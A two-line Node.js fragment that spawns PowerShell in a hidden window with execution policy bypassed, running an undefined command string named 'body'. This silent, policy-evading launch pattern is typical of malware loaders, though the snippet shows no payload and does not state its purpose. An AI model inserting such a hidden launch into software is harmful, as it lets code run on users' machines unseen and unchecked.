import cp from "node:child_process";
cp.spawn("POWERSHELL.EXE", ["/WindowStyle", "Hidden", "/ep", "Bypass", "-c", body]);
